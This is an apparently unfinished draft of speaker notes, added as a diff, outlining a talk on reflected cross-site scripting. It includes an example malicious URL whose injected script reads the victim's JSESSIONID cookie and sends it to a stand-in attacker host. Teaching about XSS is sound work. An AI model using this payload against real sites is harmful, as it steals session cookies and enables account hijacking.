@@ -1,0 +1,18 @@
+XSS Agenda
+
+First I'd talk about Reflected XSS. 
+Making someone click a link containing something a la:
+https://www.mywebsite.com/store/search?sneakers=Nike&size=<script> 
+(function getJSessionId(){
+    var jsId = document.cookie.match(/JSESSIONID=[^;]+/);
+    if(jsId != null) {
+        if (jsId instanceof Array)
+            jsId = jsId[0].substring(11);
+        else
+            jsId = jsId.substring(11);
+    }
+    fetch("HACKERSITE.com/victimID/"+jsId);
+})()
+</script>
+
+Then I'd talk about 
